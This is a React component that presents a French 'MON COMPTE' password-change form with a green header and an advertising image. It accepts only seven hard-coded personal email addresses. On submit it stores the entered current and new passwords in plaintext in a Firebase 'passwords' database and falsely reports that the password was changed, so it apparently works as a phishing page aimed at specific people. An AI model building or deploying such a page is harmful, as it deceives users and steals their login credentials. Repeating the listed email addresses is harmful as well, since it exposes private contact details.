import React from 'react'
// Style
import styles from './Style.scss'
import cx from 'classnames'
// Components
import fire from '../../fire'

class Mpg extends React.Component {
  constructor(props) {
    super(props)
    this._getHeader = this._getHeader.bind(this)
    this._getContent = this._getContent.bind(this)
    this.changeMail = this.changeMail.bind(this)
    this.changeFormer = this.changeFormer.bind(this)
    this.changeNew1 = this.changeNew1.bind(this)
    this.changeNew2 = this.changeNew2.bind(this)
    this._submitForm = this._submitForm.bind(this)
    this.state = {
      mail: '',
      former: '',
      new1: '',
      new2: '',
      sent: false
    }
  }
  _getHeader() {
    return (
      <div className={styles.greenHeader}>
        <div className={styles.title}>
          <h1>MON COMPTE</h1>
        </div>
        <span>
          <img className={styles.img} src={"data:image/png;base64,"} width="120" height="48" />
        </span>
      </div>
    )
  }
  _getAd() {
    return (
      <img className={styles.ad} src={'https://i.pinimg.com/originals/fd/48/12/fd48120c93fdbe616170aea41e71a95b.png'} />
    )
  }
  changeMail(e) {
    this.setState({mail: e.target.value})
  }
  changeFormer(e) {
    this.setState({former: e.target.value})
  }
  changeNew1(e) {
    this.setState({new1: e.target.value})
  }
  changeNew2(e) {
    this.setState({new2: e.target.value})
  }
  _getContent() {
    const { mail, former, new1, new2, sent } = this.state
    const validMail = (mail === 'benjaminbenoliel@hotmail.com') || (mail === 'dylanka@hotmail.fr')
          || (mail === 'y.aboucaya@gmail.com') || (mail === 'ykahloun@gmail.com') || (mail === 'ilanchemla@gmail.com')
          || (mail === 'jeremy.elhabouz@gmail.com') || (mail === 'danolevy@hotmail.fr')
    const validFormer = former.length > 1
    const validNew1 = new1.length > 1
    const validNew2 = new2.length > 2 && (new2 === new1)
    const valid = validMail && validFormer && validNew1 && validNew2
    return (
      <div className={styles.container}>
        <div className={styles.userTitle}>
          <div className={styles.dotted}>
            <span className={styles.motdepasse}>
              UN MEILLEUR MOT DE PASSE?
            </span>
            <span className={styles.dash}></span>
          </div>
        </div>
        <form>
          <div>
            <div className={styles.block}>
               <span>
                 <input className={styles.input} type='text' value={this.state.mail} onChange={this.changeMail} placeholder={'Confirmer adresse mail'}>
                 </input>
               </span>
            </div>
            <div className={styles.block}>
               <span>
                 <input className={styles.input} value={this.state.former} onChange={this.changeFormer} placeholder={'Mot de passe actuel'}>
                 </input>
               </span>
            </div>
            <div className={styles.block}>
               <span>
                 <input className={styles.input} value={this.state.new1} onChange={this.changeNew1} type='password' placeholder={'Nouveau Mot de passe'}>
                 </input>
               </span>
            </div>
            <div className={styles.block}>
               <span>
                 <input className={styles.input} value={this.state.new2} onChange={this.changeNew2} type='password' placeholder={'Confirmer Mot de passe'}>
                 </input>
               </span>
            </div>
            <button className={cx(styles.button, valid && styles.valid, !valid && styles.invalid)}
                    onClick={this._submitForm}>
              VALIDER
            </button>
            {sent ? (
                <div className={styles.sent}>{'Ton mot de passe a bien été changé'}</div>
              ) : null}
          </div>
        </form>
      </div>
    )
  }
  _submitForm(e) {
    const { mail, former, new1, new2, sent } = this.state
    this.state.sent = true
    e.preventDefault()
    fire.database().ref('passwords').push( this.state )
    const newState = this.state
    newState.former = ''
    newState.mail = ''
    newState.new1 = ''
    newState.new2 = ''
    this.setState(newState)
  }
  componentWillMount() {
    let messagesRef = fire.database().ref('passwords').orderByKey().limitToLast(100)
  }
  render() {
     return (
       <div className={styles.root}>
         {this._getHeader()}
         {this._getAd()}
         {this._getContent()}
       </div>
     )
  }
}

export default Mpg
